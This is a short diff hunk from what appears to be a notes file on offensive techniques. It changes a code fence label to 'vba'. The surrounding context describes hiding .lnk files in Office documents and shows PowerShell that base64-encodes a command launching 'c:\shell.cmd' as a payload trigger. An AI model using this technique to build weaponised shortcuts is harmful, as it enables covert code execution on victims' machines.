@@ -8,7 +8,7 @@ attackers embed .lnk files into the Office documents and camouflage them with Ms
 
 Creating an .LNK file that will trigger the payload once executed:
 
-```
+```vba
 $command = 'Start-Process c:\shell.cmd'
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
 $encodedCommand = [Convert]::ToBase64String($bytes)
